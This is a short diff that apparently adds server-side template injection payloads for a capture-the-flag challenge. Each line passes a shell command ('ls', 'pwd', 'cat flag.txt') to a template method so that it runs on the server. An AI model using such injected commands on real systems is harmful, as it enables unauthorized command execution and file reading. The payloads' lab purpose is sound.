@@ -1,2 +1,5 @@
+{{.FetchServerInfo "ls -l"}}
+{{.FetchServerInfo "pwd"}}
+{{.FetchServerInfo "ls -l ../"}}
 {{.FetchServerInfo "cat ../flag.txt"}}
 {{.FetchServerInfo "cat flag.txt"}}
